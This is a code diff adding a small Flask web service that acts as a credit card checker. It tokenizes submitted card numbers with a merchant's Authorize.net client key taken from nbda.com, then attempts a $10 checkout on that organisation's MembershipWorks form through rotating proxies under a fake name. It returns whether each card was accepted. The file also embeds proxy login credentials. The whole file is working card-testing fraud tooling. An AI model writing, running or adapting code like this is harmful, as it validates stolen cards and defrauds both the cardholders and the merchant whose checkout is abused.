@@ -1,0 +1,135 @@
+from flask import Flask, request, jsonify
+import requests
+import uuid
+import json
+import time
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+app = Flask(__name__)
+
+# === Original token generation ===
+def get_token(card, month, year, cvv, zip_code, name, proxies):
+    url = 'https://api2.authorize.net/xml/v1/request.api'
+    headers = {
+        'Content-Type': 'application/json; charset=UTF-8',
+        'Origin': 'https://nbda.com',
+        'Referer': 'https://nbda.com/',
+        'User-Agent': 'Mozilla/5.0'
+    }
+    payload = {
+        "securePaymentContainerRequest": {
+            "merchantAuthentication": {
+                "name": "6Wp9xwU7Db",
+                "clientKey": "824n5qLwU38rA7Rx7qn3KqceCjkzZYKebp4kLu2WPcxgdPtwedcMxuH5W72aaYx7"
+            },
+            "data": {
+                "type": "TOKEN",
+                "id": str(uuid.uuid4()),
+                "token": {
+                    "cardNumber": card,
+                    "expirationDate": f"{month}{year[-2:]}",
+                    "cardCode": cvv,
+                    "zip": zip_code,
+                    "fullName": name
+                }
+            }
+        }
+    }
+    r = requests.post(url, json=payload, headers=headers, proxies=proxies, timeout=30)
+    r.raise_for_status()
+    json_data = json.loads(r.content.decode('utf-8-sig'))
+    return json_data["opaqueData"]["dataValue"]
+
+# === Original checkout logic ===
+def send_to_checkout(token, name, email, proxies):
+    fields = {
+        'nam': name,
+        'eml': email,
+        'xbs': 'NBDA Shop',
+        'xlo': 'New York',
+        'crd[nam]': name,
+        'crd[ad1]': '123 Main St',
+        'crd[zip]': '10080',
+        'crd[cot]': 'New York County',
+        'crd[sta]': 'NY',
+        'crd[con]': 'US',
+        'crd[cit]': 'New York',
+        'crd[loc][0]': '-74.0156903',
+        'crd[loc][1]': '40.7130922',
+        'crd[tok]': token,
+        'sum': '10',
+        'itm[0][_id]': '60b163ea3936fc18ee3b11a9',
+        'itm[0][qty]': '1'
+    }
+
+    m = MultipartEncoder(fields=fields)
+    headers = {
+        'Content-Type': m.content_type,
+        'Origin': 'https://nbda.com',
+        'Referer': 'https://nbda.com/',
+        'User-Agent': 'Mozilla/5.0',
+        'x-org': '22350'
+    }
+
+    r = requests.post(
+        'https://api.membershipworks.com/v2/form/60b161d2b8a6f72e2f5433c6/checkout',
+        headers=headers,
+        data=m,
+        proxies=proxies,
+        timeout=180
+    )
+
+    # try to parse JSON and extract error message
+    try:
+        parsed = json.loads(r.text)
+        msg = parsed.get("error", "Success")
+    except Exception:
+        # if not JSON, fallback to status text
+        if r.status_code == 200:
+            msg = "Success"
+        else:
+            msg = f"HTTP {r.status_code}"
+    return msg
+
+@app.route('/process', methods=['GET', 'POST'])
+def process():
+    start_time = time.time()
+    cc = request.values.get("cc")
+    proxy = request.values.get("proxy")
+
+    if not cc:
+        return jsonify({"error": "Missing cc parameter"}), 400
+
+    # default proxy
+    proxies = {
+        "http": "http://user-PP_NUAE0G7MN3-country-US-plan-luminati:ncgncvqp@bd.porterproxies.com:8888",
+        "https": "http://user-PP_NUAE0G7MN3-country-US-plan-luminati:ncgncvqp@bd.porterproxies.com:8888"
+    }
+    if proxy:
+        proxies = {"http": proxy, "https": proxy}
+
+    try:
+        card, mm, yy, cvv = cc.strip().split("|")
+    except Exception as e:
+        return jsonify({"error": "Invalid CC format", "detail": str(e)}), 400
+
+    name = "Lucky Sex"
+    email = "justforawsyaar@gmail.com"
+    amount = 10
+
+    try:
+        token = get_token(card, mm, yy, cvv, "10080", name, proxies)
+    except Exception as e:
+        return jsonify({"error": "Token generation failed", "detail": str(e)}), 500
+
+    message = send_to_checkout(token, name, email, proxies)
+    time_taken = round(time.time() - start_time, 3)
+
+    return jsonify({
+        "amount": amount,
+        "time_taken": time_taken,
+        "message": message
+    })
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
